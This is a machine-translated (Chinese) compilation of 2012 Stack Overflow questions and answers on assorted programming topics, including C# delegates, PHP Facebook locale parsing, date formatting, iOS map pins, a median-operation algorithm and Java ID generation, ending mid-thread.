我有一个名为 ValidationMethods 的类中的 Func 列表。我通过将它们传递给 Validator.Validate(Func) 在 Validator 类中使用它们。我想知道是否有一种方法可以包装每个函数，以便我可以重载 Validate 以获取 IEnumerable 并指定要根据某个枚举值过滤的 where 类。

我这样做是为了使 API 更紧密地遵循打开/关闭原则，其中验证器可以在需要时接受更多验证类型，而无需修改验证器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:21:13.290

我希望我能正确理解你。你想要一个枚举来过滤函数：

```
enum Category {
  F1,
  F2
} 
```

然后是每个函数的包装器：

```
class FWrap<TIn, TOut> //depending on your arities
{
  public Func<TIn, TOut> Fnc {get; set;} 
  public Category Cat {get; set;}

  //some constructor and stuff
} 
```

之后，应该没有任何问题：

```
IEnumerable<FWrap<t1,t2>> funcs = getFuncs();
validators = funcs.Where(f => f.Cat == Category.F1) 
```

等等...我希望这就是你所期望的。

# php - 修剪来自 Facebook Graph API 的语言环境结果

> ID：10499216
> 
> 赞同：0
> 
> 时间：2012-05-08T13:06:19.383
> 
> 标签：php, json, facebook-graph-api, texttrimming

我正在使用 Facebook Graph API 来获取用户区域信息（更新代码）：

```
[more code]
<div id="scoreboard-overview">
    <ul>';
    $num_rows = mysql_num_rows($resulttt);
    $i = 0;
        while($row = mysql_fetch_array($resulttt)) {
            $i = $i + 1;
            $fb_data = json_decode(file_get_contents('http://graph.facebook.com/'. $row['fbID']));
            $fb_locale_str = $fb_data->locale;
            $fb_name_str = $fb_data->first_name;
            $fb_country_str = strtolower(substr($fb_locale_str, -2));
            $flag_uri = '/flags/unknown.gif'; //display a general flag if unknown.
            if (!empty($fb_country_str) && in_array($fb_country_str, $valid_flags) )
                $flag_uri = '/flags/' . $fb_country_str . '.gif';

echo '<li>
        <div class="container">
            <div class="black">
                <img src="https://graph.facebook.com/'. $row['fbID'] .'/picture" alt="" />
            </div>
            <div class="grey">
                '.$i.' '.$fb_name_str.'';
            printf ('<div class="test"><img src="%s" /></div>', $flag_uri); 
    echo '      </div>
            <div class="holder">
                <div class="blue">
                    <p>0<br />'. $row['Time'] .'</p>
                </div>
                <div class="red">
                    <img src="http://ep2.nl/images/star.gif" alt="" />
                </div>
                <div class="yellow">
                    <p>'. $row['Score'] .'</p>
                </div>
            </div> 
        </div>
    </li>';
        }
echo '</ul>
</div>
    [more code] 
```

`$row['fbID']`是用户和/或朋友的 Facebook ID（在数组中使用）

好吧，这给出了这样的结果：用户的语言`en_US`在哪里，用户的国家在哪里。国家是我追求的地方。`en``US`

我有几个看起来像这样的标志图像：`us.png`. 这些标志在适当的情况下使用 ISO3166-1 alpha-2 国家代码命名。所以我想把它修整并放在它后面，这样我就可以显示旗帜图像了`en_US`。但是如何做到这一点？`us``.png`

如果语言环境不返回任何类似 unknown.png 的东西，那么一个通用标志也会很好。

非常感谢，

莫里斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T14:56:21.130

做起来也不难。

试试这个：

```
$valid_flags = array ('us', 'ca', 'mx', '...') //You'll need to populate this one

$fb_data = json_decode(file_get_contents('http://graph.facebook.com/'. $row['fbID']);
$fb_locale_str = $fb_data->location;
$fb_country_str = strtolower(substr($fb_locale_str, -2));
$flag_uri = '/flags/unknown.png'; //display a general flag if unknown.
if (!empty($fb_country_str) && in_array($fb_country_str, $valid_flags) )
    $flag_uri = '/flags/' . $fb_country_str . '.png';
printf ('<div class="grey"><img src="%s" /></div>', $flag_uri); 
```

请注意，您不应该在 echo 语句中调用 file_get_contents 。

# php - 如何在 Symfony 1 和 2 中显示控制器生命周期

> ID：10499218
> 
> 赞同：0
> 
> 时间：2012-05-08T13:06:26.327
> 
> 标签：php, symfony1, symfony, symfony-1.4

如何在控制器中显示 Symfony 1 和 2 中会话到期的**剩余**时间？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T18:18:05.157

这现在可以在 Symfony 2.1 中完成。根据会话配置[文档](http://symfony.com/doc/master/components/http_foundation/session_configuration.html#session-meta-data)，您可以使用新的[`MetadataBag`](http://api.symfony.com/master/Symfony/Component/HttpFoundation/Session/Storage/MetadataBag.html).

`$session->getMetadataBag()->getCreated();`将在创建会话时为您提供，`$session->getMetadataBag()->getLifetime();`并将为您提供 cookie 的生命周期。只需从当前时间中减去，您就应该得到到期前的剩余时间。

# asp.net - Sharepoint，例如使用 ASP.NET 在 Microsoft Word 中编辑文档 - Office 集成

> ID：10499220
> 
> 赞同：1
> 
> 时间：2012-05-08T13:06:57.743
> 
> 标签：asp.net, ms-word

我正在从事一个文档管理项目，客户想要编辑文档，就像在 sharepoint 中所做的那样。所以当用户在word中点击编辑文档并进行修改保存时，应该保存在服务器上。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T16:30:09.303

对于 Word，我会使用像[这样](http://www.textcontrol.com/en_US/products/dotnetserver/overview/)的第三方 UI 控件。

# php - 在php中更改变量的日期格式

> ID：10499224
> 
> 赞同：1
> 
> 时间：2012-05-08T13:07:09.027
> 
> 标签：php

如果我有一个值为: 的变量`May-2012`，如何将变量的格式更改为`2012-05-01`;

例如：

```
$data1 = 'May-2012';
$data2 = $data1('Y-m-01'); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:09:21.053

`$data2 = date( 'Y-m-d', strtotime( $data1 ) );`

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-08T13:09:33.883

您可以使用`DateTime::createFromFormat` [http://www.php.net/manual/en/datetime.createfromformat.php](http://www.php.net/manual/en/datetime.createfromformat.php)

```
$data1 = DateTime::createFromFormat("F-Y", 'May-2012');
echo $data1->format("Y-m-d");
echo $data1->format("Y-m-01"); 
```

输出

```
2012-05-08
2012-05-01 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:10:00.583

```
$date = DateTime::createFromFormat('F-Y', 'May-2012');
$date = $date->format('Y-m-d'); 
```

# java - html:text 如何设置占位符属性

> ID：10499225
> 
> 赞同：3
> 
> 时间：2012-05-08T13:07:15.127
> 
> 标签：java, html, jsp

我主要做 HTML/CSS/JS，所以我有点迷失在这里，所以不知道这是否可能是我想要的方式，就是这样：

我有这个代码

```
<html:text styleClass="span4" title="No spaces or dashes" /> 
```

我希望此输入使用属性“占位符”呈现。我该怎么办？

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:17:08.363

如果 struts 没有提供，那么你可以在需要时使用 jQuery 注入它

```
$("#idOfInputText").attr('placeholder', 'some text') 
```

`styleId`您可以使用struts 标签的属性提供 id

# iphone - MKPinAnnotationView 与 MKAnnotationView

> ID：10499226
> 
> 赞同：3
> 
> 时间：2012-05-08T13:07:19.163
> 
> 标签：iphone, mkmapview, mkannotationview, mkpinannotationview

我继承了一个引发此警告的项目

```
Incompatible pointer types assigning to 'MKPinAnnotationView *' from 'MKAnnotationView *' 
```

在这条线上

```
pinView=[[[MKAnnotationView alloc]initWithAnnotation:annotation reuseIdentifier:defaultPinID]autorelease];
    } 
```

我想在没有警告的情况下退回项目，所以我希望这里有人能快速回答

完整代码：

```
-(MKAnnotationView *)mapView:(MKMapView *)mV viewForAnnotation: (id  <MKAnnotation>)annotation {
    MKPinAnnotationView *pinView = nil; 

    NSUserDefaults *prefs=[NSUserDefaults standardUserDefaults];

    if(annotation != mapView.userLocation) 

    {

        static NSString *defaultPinID = @"com.invasivecode.pin";

        pinView = (MKPinAnnotationView *)[mapView  dequeueReusableAnnotationViewWithIdentifier:defaultPinID];

        if (!pinView) {
            pinView=[[[MKAnnotationView alloc]initWithAnnotation:annotation reuseIdentifier:defaultPinID]autorelease];
        }

    }   
    pinView.animatesDrop=YES;
    [mapView.userLocation setTitle:@"I am here"];
    [mapView.userLocation setSubtitle:[prefs objectForKey:@"CurrentLocationName"]];
    return pinView;        
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:23:42.030

该`pinView`变量被声明为 an`MKPinAnnotationView`但该行创建一个`MKAnnotationView`.

更改此行：

```
pinView=[[[MKAnnotationView alloc]initWithAnnotation... 
```

至：

```
pinView=[[[MKPinAnnotationView alloc]initWithAnnotation... 
```

您还应该有`else`一部分来`if`处理注释视图的重用：

```
else
    pinView.annotation = annotation; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:21:14.417

您正在对 pin 注释视图进行出队，同时您将注释视图分配为您的 pinview，这在技术上是错误的！！！这就是我猜它发出警告的原因。试试这个可能会解决你的问题。

```
-(MKAnnotationView *)mapView:(MKMapView *)mV viewForAnnotation: (id  <MKAnnotation>)annotation {

pinView = (MKPinAnnotationView *)[mapView  dequeueReusableAnnotationViewWithIdentifier:defaultPinID];

if (!pinView) {
        pinView=[[[MKPinAnnotationView alloc]initWithAnnotation:annotation reuseIdentifier:defaultPinID]autorelease];
    }

..........
..........

} 
```

# c# - 联合安全上的双通道绑定

> ID：10499228
> 
> 赞同：1
> 
> 时间：2012-05-08T13:07:23.697
> 
> 标签：c#, wcf, .net-4.0, sts-securitytokenservice

我们正在通过 HTTPS 运行一组 WCF 服务，并使用 ws2007FederationHttpBinding 绑定对 STS 进行身份验证。

现在我们需要使用相同的身份验证技术添加双工/双工服务。 [了解您的绑定选项](http://wcfsecurityguide.codeplex.com/wikipage?title=Know%20your%20binding%20options)声明只有 wsDualHttpBinding 可用于双工服务。我可以将它与我的 STS 一起使用吗？如果可以，有人知道如何配置它吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-06-26T15:20:26.843

不，如果朝外，双重绑定通常是个坏主意。 [http://blog.gdssecurity.com/labs/2010/2/12/abusing-wcf-to-perform-remote-port-scans.html](http://blog.gdssecurity.com/labs/2010/2/12/abusing-wcf-to-perform-remote-port-scans.html) 了解风险...

# android - 在 MIT App 发明者应用程序中如何获取设备 ID

> ID：10499229
> 
> 赞同：1
> 
> 时间：2012-05-08T13:07:31.383
> 
> 标签：android, app-inventor

有什么方法可以使用 MIT App Inventor 获取设备 ID？

我正在使用其他东西的活动启动器并设置如下属性：

*   行动：`android.intent.action.ACTION_MAIN`
*   活动课：`TelephonyManager`
*   活动套餐：`android.telephony`

这是获取设备ID的正确过程吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T23:00:34.900

**正如 Gary 已经提到的，这在 AI编辑**中目前是不可能的：但是，您可以使用 OAuth 识别用户，请参阅此处的示例[http://puravidaapps.com/taifunOA.php](http://puravidaapps.com/taifunOA.php)。用户可以授权应用程序获取他的电子邮件地址以进行识别。

**更新**：现在有了新的扩展功能，您可以使用扩展来获取此信息，[另请参阅我的答案here](https://stackoverflow.com/a/37193572/1545993)。

# algorithm - 数组中值变换最小步数

> ID：10499230
> 
> 赞同：5
> 
> 时间：2012-05-08T13:07:39.617
> 
> 标签：algorithm

给定一个包含 n 个整数的数组 A。在一个回合中，可以将以下操作应用于任何连续的子数组 A[l..r] ：分配给子数组 A[l..r] 的所有 A i (l <= i <= r) 中位数。令 max 为 A 的最大整数。我们想知道将 A 更改为由 n 个整数组成的数组所需的最小操作数，每个整数的值为 max。例如，让 A = [1, 2, 3] 。我们想把它改成 [3, 3, 3] 。我们可以通过两个操作来做到这一点，首先对子数组 A[2..3] （之后 A 等于 [1, 3, 3] ），然后对 A[1..3] 进行操作。此外，为某些数组 A 定义中位数如下。设 B 是相同的数组 A ，但按非降序排序。A 的中位数是 B m （基于 1 的索引），其中 m 等于 (n div 2)+1 。这里的'div'是一个整数除法运算。所以，对于一个有 5 个元素的排序数组，

由于 N 的最大值是 30。我想暴力破解结果可能有更好的解决方案。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:46:38.897

您可以在每次迭代中将包含最大元素的子数组的大小加倍。在第一次迭代之后，有一个大小为 2 的子数组包含最大值。然后将您的操作应用于包含这两个元素的大小为 4 的子数组，为您提供包含最大值的大小为 4 的子数组。然后应用于大小为 8 的子数组，依此类推。您在 log2(N) 操作中填充数组，这是最佳的。如果 N 为 30，则五次操作就足够了。

这在最坏的情况下（即只有一个元素是最大值时）是最佳的，因为它在每次迭代中设置了尽可能多的元素。

**更新 1**：我注意到我把 4s 和 8s 搞砸了。已更正。

**更新 2**：这是一个例子。数组大小10，开始状态：

```
[6 1 5 9 3 2 0 7 4 8] 
```

要获得两个 9，请在包含 9 的大小为 2 的子数组上运行 op。例如 A[4…5] 让你：

```
[6 1 5 9 9 2 0 7 4 8] 
```

现在在包含 4…5 的大小为 4 的子数组上运行，例如在 A[2…5] 上运行以获得：

```
[6 9 9 9 9 2 0 7 4 8] 
```

现在在大小为 8 的子数组上，例如 A[1…8]，得到：

```
[9 9 9 9 9 9 9 9 4 8] 
```

现在加倍会得到 16 个 9，但我们只有 10 个位置，所以轮到 A[1…10]，得到：

```
[9 9 9 9 9 9 9 9 9 9] 
```

**更新 3**：由于这仅在最坏的情况下是最佳的，因此它实际上不是原始问题的答案，它要求找到一种方法来找到所有输入的最小操作数。我将关于暴力破解的句子误解为关于中间操作的暴力破解，而不是找到最小的操作序列。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-11T09:54:16.280

这是 codechef Long Contest 的问题。由于比赛已经结束，所以很尴尬，我正在粘贴问题设置器方法（来源：CC Contest 编辑页）。

“数组的任何状态都可以表示为二进制掩码，每个位 1 表示对应的数字等于最大值，否则为 0。您可以使用状态 R[掩码] 和 O(n) 转换运行 DP。您可以证明（或者只是相信）statest 的数量不会很大，当然如果你运行良好的 DP。我们的 DP 的状态将是等于 max 的数字的掩码。当然，仅使用操作是有意义的对于这样的子数组 [l; r]，1 位的数量至少与子掩码 [l;r] 中的 0 位的数量一样多，因为否则什么都不会改变。另外你应该注意到，如果你的左边界"

C/C++ 代码是::

```
#include <cstdio>
#include <iostream>
using namespace std;

int bc[1<<15];
const int M = (1<<15) - 1;

void setMin(int& ret, int c)
{
    if(c < ret) ret = c;
}

void doit(int n, int mask, int currentSteps, int& currentBest)
{
    int numMax = bc[mask>>15] + bc[mask&M];
    if(numMax == n) {
        setMin(currentBest, currentSteps);
        return;
    }
    if(currentSteps + 1 >= currentBest)
        return;
    if(currentSteps + 2 >= currentBest)
    {
        if(numMax * 2 >= n) {
            setMin(currentBest, 1 + currentSteps);
        }
        return;    
    }  

    if(numMax < (1<<currentSteps)) return;

    for(int i=0;i<n;i++) 
    {
        int a = 0, b = 0;
        int c = mask;
        for(int j=i;j<n;j++)
        {
            c |= (1<<j);
            if(mask&(1<<j)) b++;
            else a++;
            if(b >= a) {
                doit(n, c, currentSteps + 1, currentBest);
            }
        }
    }
}

int v[32];
void solveCase() {
    int n;
    scanf(" %d", &n);
    int maxElement = 0;
    for(int i=0;i<n;i++) {
        scanf(" %d", v+i);
        if(v[i] > maxElement) maxElement = v[i];
    }
    int mask = 0;
    for(int i=0;i<n;i++) if(v[i] == maxElement) mask |= (1<<i);
    int ret = 0, p = 1;
    while(p < n) {
        ret++;
        p *= 2;
    }
    doit(n, mask, 0, ret);
    printf("%d\n",ret);
}

main() {
    for(int i=0;i<(1<<15);i++) {
        bc[i] = bc[i>>1] + (i&1);
    }
    int cases;
    scanf(" %d",&cases);
    while(cases--) solveCase();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-11T23:18:45.753

问题制定者方法具有指数复杂性。N = 30 非常好。但对于更大的尺寸，情况并非如此。我认为，找到指数时间解决方案更有趣。我找到了一个，复杂度为 O(N ^(4 )。)

这种方法利用了这样一个事实，即最优解从一组连续的最大元素开始，并且只扩展这一个组，直到整个数组被最大值填充。

为了证明这一事实，取 2 个连续最大元素的起始组，并以最佳方式扩展它们中的每一个，直到它们合并为一个组。假设第 1 组需要 X 轮才能增长到 M 大小，第 2 组需要 Y 轮才能增长到相同大小 M，并且在轮 X + Y + 1 时这些组合并。结果是一组大小至少为 M * 4。现在不是为第 2 组转 Y，而是为第 1 组额外转 X + 1。在这种情况下，组大小至少为 M * 2，最多为 M / 2 （即使我们最初计算最大元素，也可能包含在步骤 Y 中）。在此更改之后，在第 X + Y + 1 轮，合并组大小至少为 M * 4，仅作为第一个组扩展的结果，从第二组中添加至少一个元素。因此，在这里扩展单个组会以相同的步数产生更大的组（如果 Y > 1，它甚至需要更少的步骤）。由于这适用于相等的组大小 (M)，因此对于不相等的组会更好。这个证明可以扩展到多组（多于两个）的情况。

要处理单组连续最大元素，我们只需要跟踪两个值：组的开始位置和结束位置。这意味着可以使用三角矩阵来存储所有可能的组，从而允许使用动态规划算法。

### 伪代码：

```
For each group of consecutive maximal elements in original array:
  Mark corresponding element in the matrix and clear other elements
  For each matrix diagonal, starting with one, containing this element:
    For each marked element in this diagonal:
      Retrieve current number of turns from this matrix element
      (use indexes of this matrix element to initialize p1 and p2)
      p2 = end of the group
      p1 = start of the group
      Decrease p1 while it is possible to keep median at maximum value
      (now all values between p1 and p2 are assumed as maximal)
      While p2 < N:
        Check if number of maximal elements in the array is >= N/2
          If this is true, compare current number of turns with the best result \
               and update it if necessary
          (additional matrix with number of maximal values between each pair of
            points may be used to count elements to the left of p1 and to the
            right of p2)
        Look at position [p1, p2] in the matrix. Mark it and if it contains \
            larger number of turns, update it
        Repeat:
          Increase p1 while it points to maximal value
          Increment p1 (to skip one non-maximum value)
          Increase p2 while it is possible to keep median at maximum value
        while median is not at maximum value 
```

为了保持算法简单，我没有提到组从位置 0 开始或在位置 N 结束时的特殊情况，跳过初始化并且没有进行任何优化。

# java - Eclipse 不在运行时将 Groovy 脚本编译成 java 类

> ID：10499231
> 
> 赞同：8
> 
> 时间：2012-05-08T13:07:40.337
> 
> 标签：java, eclipse, groovy

奇怪的是，我没有任何编译时错误，但是在运行应用程序时，我收到 Groovy 类的 NoClassDefFound 错误。

我正在使用带有 Groovy 2.7.0 插件的 Eclipse 3.6。我的机器上安装了 Groovy 1.8.5，并且 groovy-all.jar 在我的应用程序类路径中。

我可以在 WEB-INF/classes 文件夹中看到所有带有 .groovy 扩展名而不是 .class 扩展名的 groovy 文件。

我在这里缺少什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-08T16:05:22.347

两种可能：

1.  您的项目不是一个 groovy 项目，因此您的 groovy 文件被视为资源（而不是源）。资源被复制到输出文件夹，而源被编译。确保您的项目图标上有一个小的*GR*符号。

2.  或者您可能无意中为您的 groovy 文件所在的源文件夹启用了脚本文件夹。转到 Preferences -> Groovy -> Compiler 并查看有关 Groovy Script Folders 的部分。请注意，Groovy 脚本文件夹也可以基于每个项目进行配置，因此您可能还需要查看 Project -> Properties -> Groovy Compiler。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T16:08:00.590

确保您使用`groovy`而不是执行代码`java`。否则，您必须在类路径中链接 groovy.jar 文件。请参阅此[讨论](https://stackoverflow.com/q/378905/845279)。

# cakephp - CakePHP 蛋糕后台控制台-应用程序没有按照我的预期进行

> ID：10499232
> 
> 赞同：0
> 
> 时间：2012-05-08T13:07:40.817
> 
> 标签：cakephp

如果在某处提到这一点，那么非常抱歉，但我尝试过搜索高低，但在任何地方都找不到。:(

首先，我是蛋糕的新手。我买了一本书，开始 cakephp，apress，David Golding，它在这里使用了蛋糕烘焙（真的希望它没有，因为它真的没有意义！）。我无法使用 cygwin 进行设置，但使用 Windows 控制台安装了它。

在书中它告诉我输入： cake bake -app ~/Sites/blog/app 然后它显示的屏幕是要烘烤的内容。视图、控制器等。

但是我不知道网站是什么，因为它第一次提到这个！所以我正在尝试：

cake bake -app ~C:/wamp/www/blog/app 我得到下一个屏幕：你想要烘焙的项目的路径是什么？

请请帮忙，我哪里错了，为什么我没有看到想烤的东西。视图、控制器等屏幕？？我现在真的坚持这一点，因为下一章需要控制台创建的位。

我正在使用 wamp 和最新的 cakephp。我的蛋糕文件夹是 ~C:/wamp/www/blog/ （博客是重命名的蛋糕）。

我的控制台环境设置设置为：;C:\wamp\bin\php\php5.3.10;C:\wamp\www\blog\app\Console

我真的很感谢任何人/每个人的帮助。我可能是一个正确的扳手，但无法理解我应该输入的内容。

非常感谢，艾伦

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:20:11.877

您应该始终导航到您的应用程序目录并从那里（相对地）执行 cake：

```
 /path/to/test/>../lib/Cake/Console/cake 
```

或者 - 如果你有一个 Config 文件夹 - 可能也有（虽然我以前从未使用过那个）

```
 /path/to/test/>Console/cake 
```

这就是它在 2.x 中的工作方式。万无一失。

@see [http://cakephp.lighthouseapp.com/projects/42648/tickets/2761](http://cakephp.lighthouseapp.com/projects/42648/tickets/2761)

另见[http://www.dereuromark.de/2011/10/31/freshly-baked-cake2-0-tips/](http://www.dereuromark.de/2011/10/31/freshly-baked-cake2-0-tips/)

# c# - OpenRasta 在单元测试中模拟 HttpContext

> ID：10499237
> 
> 赞同：4
> 
> 时间：2012-05-08T13:07:58.353
> 
> 标签：c#, nunit, openrasta

目前我正在使用**NUnit**为我的处理程序方法编写单元测试。我在我的一个控制器方法中使用过，当我为我的处理程序执行测试用例时`HttpContext.Current`，它会引发 NULL 引用异常。`HttpContext.Current`

有什么方法可以模拟**HttpContext**吗？或者有没有其他方法可以解决这个问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T11:04:22.057

您不需要`HttpContext.Current`直接访问。您应该能够使用易于模拟的**[可用依赖项之一。](https://github.com/openrasta/openrasta/wiki/Available-Dependencies)**

# iphone - 不能在 Ogre iPhone SDK 版本中包含 boost 库

> ID：10499238
> 
> 赞同：1
> 
> 时间：2012-05-08T13:07:59.383
> 
> 标签：iphone, xcode4, ogre3d, ogre

我安装了 Ogre3D iPhone SDK 并尝试在 XCode4 中编译示例项目。我遇到了许多人在 XCode4 中遇到的“词汇或预处理器问题”。就我而言，XCode 无法处理“OgreCamera.h”。

我设法通过在我的项目中创建一个“索引”组文件夹并按照此线程中的建议将头文件拖入其中来解决此问题：

[Xcode 4（和依赖项）的编译、构建或存档问题](https://stackoverflow.com/questions/5584317/compile-build-or-archive-problems-with-xcode-4-and-dependancies)

但是，我以不同的形式再次遇到了同样的问题。没有更多关于“OgreCamera.h”的错误，但现在我得到“找不到'boost/thread/tss.hpp'文件”。我已将 boost 文件夹和各个 boost 头文件拖到 Indexing 组中，但没有效果。

我所有的包含路径都配置正确，XCode 应该能够根据我的构建设置找到这些文件。

我不知道该怎么办。我已经寻找解决方案，但没有找到任何解决方案。我最好的猜测是索引组的内容需要是一个没有子文件夹的平面层次结构，但是 Ogre 使用文件路径引用 boost 头文件：“boost/thread/tss.hpp”，这会导致一些问题原因。但我不知道如何修复它。

有没有人有什么建议？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-23T23:38:26.493

我有同样的问题。我将 boost 复制到 OgreSDK 的根目录中，然后将以下内容添加到我的标题搜索路径中

```
$(SRCROOT)/boost 
```

您会注意到包含的文件是“boost/thread/tss.hpp”。所以使用上面的标题搜索路径，它会寻找`$(SRCROOT)/boost/boost/thread/tss.hpp`.

假设您`$SRCROOT/include`在标题搜索路径中有 - 解决方案只是将 boost 文件夹移动到您的包含目录。

PS...如果您没有 boost 文件夹，则需要下载 boost 并将其复制到那里。

# vnc - 使用 Guacamole VNC 时禁用本地光标

> ID：10499242
> 
> 赞同：2
> 
> 时间：2012-05-08T13:08:13.977
> 
> 标签：vnc, guacamole

我正在使用 Guacamole VNC Web 客户端查看器，我想隐藏本地浏览器光标，否则你会看到两个光标，这会让人感到困惑。

我可以使用简单的样式隐藏浏览器鼠标： cursor:none; 但这不太好，因为当发生某些连接异常时，我需要浏览器鼠标才能关闭错误窗口等。

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T16:01:03.347

您想要的是隐藏远程光标而不是本地光标。VNC 协议允许您隐藏远程光标。大多数 VNC 客户端都支持这一点。例如，在[noVNC](https://github.com/kanaka/noVNC)（HTML5 VNC 客户端）中，有一个“本地光标”选项可以隐藏远程光标，以便您只能看到一个光标。

不幸的是，你现在不能在鳄梨酱中这样做。Guacamole 中有一个长期存在的错误来添加此支持： http: [//guac-dev.org/trac/ticket/33](http://guac-dev.org/trac/ticket/33)

**更新：**该选项已在鳄梨酱中修复。

# silverlight-4.0 - 在 SelectionChanged 事件中使整个 DataGrid 行可编辑

> ID：10499243
> 
> 赞同：1
> 
> 时间：2012-05-08T13:08:17.317
> 
> 标签：silverlight-4.0

我有一个绑定到某些数据的 DataGrid。我已经实现了 SelectionChanged 事件。现在我的问题是我必须在选择更改时使整行可编辑。有什么帮助？？？

# c# - 从 datagrid 获取数据返回空字符串

> ID：10499245
> 
> 赞同：1
> 
> 时间：2012-05-08T13:08:21.163
> 
> 标签：c#, wpf, .net-4.0, wpf-controls

在一个项目中，我试图获取已插入`datagrid`from the`datagrid`的数据，但我正在为所有字段获取空字符串。

数据网格的 xaml 声明是：

```
<DataGrid  RowEditEnding="linesGrid_RowEditEnding" CanUserResizeColumns="True" CanUserSortColumns="True" Grid.ColumnSpan="2"  AutoGenerateColumns="True" ItemsSource="{Binding}" Name="linesGrid" /> 
```

我用于获取数据的事件是 RowEditEnding，但我没有获取新行的数据，事件处理程序的实现是：

```
String LineID;
        String Connection_Type;

        //MessageBox.Show(linesGrid.Items.Count.ToString());

        for (int i = 0; i < linesGrid.Items.Count - 1; i++)
        {
            System.Data.DataRowView item = (System.Data.DataRowView)linesGrid.Items[3];

            //fetch columns
            LineID = item.Row[0].ToString();
            MessageBox.Show(LineID);
            Connection_Type = item.Row[1].ToString();
            MessageBox.Show(Connection_Type);

        } 
```

我做错了什么，因为消息框正在获取空字符串。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:19:24.903

你为什么要循环而不是使用循环中的 i ？

```
 for (int i = 0; i < linesGrid.Items.Count - 1; i++)
    {
        System.Data.DataRowView item = (System.Data.DataRowView)linesGrid.Items[3];

        //fetch columns
        LineID = item.Row[0].ToString();
        MessageBox.Show(LineID);
        Connection_Type = item.Row[1].ToString();
        MessageBox.Show(Connection_Type);

    } 
```

你的意思是？

```
 System.Data.DataRowView item = (System.Data.DataRowView)linesGrid.Items[i]; 
```

# android - Android Sensor.TYPE_MAGNETIC_FIELD 与 WindowsPhone Sensor.TYPE_MAGNETIC_FIELD

> ID：10499250
> 
> 赞同：0
> 
> 时间：2012-05-08T13:08:36.717
> 
> 标签：android, windows-phone-7

在 SensorChanged 事件中，event.values 在 Android 中有 value[0]、value[1] 和 value[2]。

> value[0] 相当于 Windows Phone 中的 e.SensorReading.MagneticHeading。

像那样，我想知道 value[1] 和 value[2] 的等效值。任何人都可以定义这个。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T03:42:12.790

在 Android 上，根据[Sensor.TYPE_MAGNETIC_FIELD](http://developer.android.com/reference/android/hardware/SensorEvent.html#values "Sensor.TYPE_MAGNETIC_FIELD")，该`value`数组对应于磁力计在 X、Y 和 Z 方向上的微特斯拉读数。如果您查看[CompassReading Structure](http://msdn.microsoft.com/en-us/library/microsoft.devices.sensors.compassreading%28v=vs.92%29.aspx "罗盘阅读结构")的MSDN 文档，`MagnetometerReading`它将为您`Vector3`提供设备的原始磁力计读数。

需要注意的一件事是 MSDN 文档特别指出这些是**原始**读数，而 Android 文档没有指定这一点。因此，您可能会在两个系统之间获得非常不同的读数。

MSDN 有一篇关于[如何：从 Windows Phone 的指南针传感器获取数据](http://msdn.microsoft.com/en-us/library/hh202974%28v=vs.92%29.aspx "如何：从 Windows Phone 的指南针传感器获取数据")的好文章，这将是一个很好的起点。

# azure - Azure 订阅升级

> ID：10499252
> 
> 赞同：1
> 
> 时间：2012-05-08T13:08:38.340
> 
> 标签：azure, subscription

我们最近为 Imagine Cup Round 2 Windows Phone 比赛提交了一个 Windows Phone 应用程序。我们将 Windows Azure 服务用于我们的 Windows Phone 应用程序。不幸的是，我们的 Azure 订阅已达到其限制并已被禁用。Imagine Cup 团队为我们提供了 Azure 的 180 天免费试用期，但我们尚未使用。是否可以升级我们现有的订阅以包括 180 天期限？如果您能尽快回复并帮助我们，我们将非常感激，因为如果服务尚未准备好并且评审过程即将开始，我们的应用程序将无法运行。我们非常感谢任何形式的帮助。

问候哈约本·辛格

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:43:09.453

您需要通过 Microsoft 支持打开一个案例。他们应该能够帮助或至少告诉您什么是可能的：

[https://support.microsoft.com/oas/default.aspx?&c1=501&gprid=14928&&st=1&wfxredirect=1&sd=gn](https://support.microsoft.com/oas/default.aspx?&c1=501&gprid=14928&&st=1&wfxredirect=1&sd=gn)

# java - 创建对象时如何在构造函数中自动分配变量

> ID：10499253
> 
> 赞同：1
> 
> 时间：2012-05-08T13:08:39.000
> 
> 标签：java

假设我们只有一个简单的对象 Person ，它具有 int ID 来标识它。如何在该类 Person 的构造函数中为 Person 的每个新实例提供新的 ID 值 (+1)？（我没有为此使用数据库）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-08T13:11:26.557

使用静态`AtomicInteger`：

```
final class Foo {
  private static final AtomicInteger seed = new AtomicInteger();
  private final int id;

  public Foo() {
    this.id = seed.incrementAndGet();
  }
} 
```

有关更多信息，请参见此处：[https ://stackoverflow.com/a/4818753/17713](https://stackoverflow.com/a/4818753/17713)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:11:22.117

使用静态变量；静态变量不绑定到类实例，而是直接绑定到类。

示例（在 C# 中）：

```
public class Person{
    public static int Increment = 1;

    public int ID;
    public Person(){
        this.ID = Increment;
        Increment++;
    }
} 
```

这样，所有类实例都将具有唯一的 ID-s（递增 1）。

编辑：这种方法不是线程安全的，请参阅@Mudu 的回答。

* * *

## 回答 #3

> 赞同：1
> 
